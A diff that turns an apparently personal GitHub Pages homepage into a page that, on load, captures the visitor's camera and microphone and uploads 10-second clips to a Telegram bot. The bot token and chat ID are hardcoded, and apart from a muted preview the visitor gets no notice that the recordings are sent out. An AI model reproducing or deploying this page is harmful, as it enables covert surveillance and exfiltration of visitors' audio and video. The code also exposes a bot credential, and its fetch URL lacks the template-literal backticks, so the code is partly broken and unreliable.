@@ -1,11 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>My Personal Website</title>
+  <title>Telegram Continuous Video Test</title>
 </head>
 <body>
-  <h1>Hello from Nikhil!</h1>
-  <p>This is my personal HTTPS site hosted on GitHub Pages.</p>
+  <h1>Continuous Video to Telegram</h1>
+  <video id="preview" autoplay playsinline muted></video>
+
+  <script>
+    const BOT_TOKEN = "8341564010:AAGbmOK0aGXFrEvCIBxmrllD8pAYqVhLiX0";
+    const CHAT_ID = "1851300622";
+    const preview = document.getElementById("preview");
+    let mediaRecorder;
+    let stream;
+
+    async function start() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        preview.srcObject = stream;
+        startRecordingLoop();
+      } catch (err) {
+        alert("Permission denied or error: " + err);
+      }
+    }
+
+    function startRecordingLoop() {
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          sendToTelegram(event.data);
+        }
+      };
+
+      // Loop every 10 seconds
+      setInterval(() => {
+        if (mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
+        mediaRecorder.start();
+        setTimeout(() => {
+          if (mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+          }
+        }, 10000); // 10 seconds per clip
+      }, 11000); // small gap between clips
+    }
+
+    function sendToTelegram(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('video', blob, 'clip.webm');
+
+      fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendVideo, {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => console.log("Sent to Telegram:", data))
+      .catch(err => console.error("Error sending:", err));
+    }
+
+    start();
+  </script>
 </body>
 </html>
